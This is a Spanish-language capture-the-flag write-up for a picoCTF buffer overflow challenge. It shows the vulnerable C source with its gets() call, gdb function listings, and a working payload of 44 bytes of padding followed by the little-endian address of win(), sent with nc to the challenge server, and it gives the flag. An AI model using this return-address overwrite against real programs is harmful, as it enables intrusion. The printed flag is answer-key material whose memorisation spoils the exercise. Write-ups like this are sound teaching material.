## Descripción
Control the return address

Additional details will be available after launching your challenge instance.

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 55558`
## Pistas 
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.

## Solución

-  Nos proporciona el archivo ejecutable vuln y su código fuente vuln.c:
```
                                    
┌──(kali㉿kali)-[~]
└─$ cat vuln.c.1   
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}


┌──(kali㉿kali)-[~]
└─$ gdb vuln.1
GNU gdb (Debian 13.1-2) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln.1...
(No debugging symbols found in vuln.1)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini


```
- Aquí, gets() se usa en la línea 26, que es una función vulnerable porque no verifica el desbordamiento, por lo que aprovecharemos eso. La función win() contiene el lector de banderas, así que esta es la función a la que queremos saltar. Usé pwndbg y usé info functions.
- win() esta en 0x080491f6, así que esta es la dirección de retorno que queremos sobrescribir. Sé que se pueden usar 44 bytes para desbordar el búfer y reescribir la dirección de retorno, así que preparé el relleno de 44 A, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
- Se necesita cambiar el endianness por la dirección de retorno, así que usé, \xf6\x91\x04\x08

```
┌──(kali㉿kali)-[~]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 64880
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}
```

## Bandera
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas Adicionales


## Referencias
https://www.cs.virginia.edu/~evans/cs216/guides/x86.html